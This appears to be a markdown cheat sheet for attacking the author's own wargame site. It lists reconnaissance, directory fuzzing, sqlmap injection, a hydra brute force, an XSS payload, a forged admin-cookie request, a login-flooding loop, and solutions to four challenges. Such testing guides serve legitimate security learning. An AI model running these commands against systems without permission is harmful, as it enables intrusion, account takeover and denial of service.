# Kali Linux Security Testing Guide
# Target: https://theprivacy.vercel.app

## 🎯 Quick Start Commands

### 1. Basic Reconnaissance
```bash
# Nmap scan
nmap -sV -sC theprivacy.vercel.app

# Whatweb fingerprinting
whatweb https://theprivacy.vercel.app

# SSL/TLS check
sslscan theprivacy.vercel.app
```

### 2. Directory Enumeration
```bash
# Gobuster (fast)
gobuster dir -u https://theprivacy.vercel.app -w /usr/share/wordlists/dirb/common.txt

# Dirb (classic)
dirb https://theprivacy.vercel.app /usr/share/wordlists/dirb/common.txt

# Ffuf (modern)
ffuf -u https://theprivacy.vercel.app/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### 3. Vulnerability Scanning
```bash
# Nikto web scanner
nikto -h https://theprivacy.vercel.app

# WPScan (if WordPress)
wpscan --url https://theprivacy.vercel.app

# SQLMap (SQL injection)
sqlmap -u "https://theprivacy.vercel.app/api/auth/login" --data="username=test&password=test" --batch
```

### 4. Brute Force Attack
```bash
# Hydra login brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt theprivacy.vercel.app http-post-form "/api/auth/login:username=^USER^&password=^PASS^:Invalid"

# Burp Suite Intruder
# Use Burp Suite GUI for advanced attacks
```

### 5. XSS Testing
```bash
# Manual XSS payloads
curl -X POST https://theprivacy.vercel.app/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"<script>alert(1)</script>","password":"test"}'

# XSStrike automated
xsstrike -u "https://theprivacy.vercel.app/challenge/10"
```

### 6. CSRF Testing
```bash
# Check CSRF tokens
curl -v https://theprivacy.vercel.app/api/auth/login

# Test CSRF vulnerability
curl -X POST https://theprivacy.vercel.app/api/admin/users/ban \
  -H "Cookie: user_session=admin" \
  -d '{"username":"victim"}'
```

### 7. API Fuzzing
```bash
# Wfuzz API endpoints
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  --hc 404 https://theprivacy.vercel.app/api/FUZZ

# Test rate limiting
for i in {1..100}; do
  curl -X POST https://theprivacy.vercel.app/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong"}' &
done
```

## 🔍 Known Vulnerabilities (Intentional for Wargame)

### Challenge 10: View Source
```bash
curl https://theprivacy.vercel.app/challenge/10 | grep -i "flag"
```

### Challenge 11: Right-click Disabled
```bash
# Bypass with curl
curl https://theprivacy.vercel.app/challenge/11 | grep -i "password"
```

### Challenge 12: Directory Traversal
```bash
# Check /files/ directory
curl https://theprivacy.vercel.app/files/
curl https://theprivacy.vercel.app/files/passwords.txt
```

### Challenge 13: robots.txt
```bash
curl https://theprivacy.vercel.app/robots.txt
curl https://theprivacy.vercel.app/s3cr3t/
```

## 🛠️ Advanced Tools

### Metasploit
```bash
msfconsole
use auxiliary/scanner/http/dir_scanner
set RHOSTS theprivacy.vercel.app
run
```

### OWASP ZAP
```bash
zaproxy -quickurl https://theprivacy.vercel.app
```

### Burp Suite
```bash
burpsuite
# Configure proxy: 127.0.0.1:8080
# Set browser to use proxy
# Intercept and modify requests
```

## 📊 Reporting

### Generate Report
```bash
# Nmap XML output
nmap -sV -oX scan.xml theprivacy.vercel.app

# Nikto HTML report
nikto -h https://theprivacy.vercel.app -o report.html -Format html
```

## ⚠️ Legal Notice

This is for **educational purposes only** on YOUR OWN wargame platform.
Never test on systems you don't own or have permission to test!

## 🎓 Learning Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- HackTheBox: https://hackthebox.com
- TryHackMe: https://tryhackme.com
- PortSwigger Web Security Academy: https://portswigger.net/web-security

---

**Target**: https://theprivacy.vercel.app
**Admin Panel**: https://theprivacy.vercel.app/admin
**API Docs**: Check /api/* endpoints
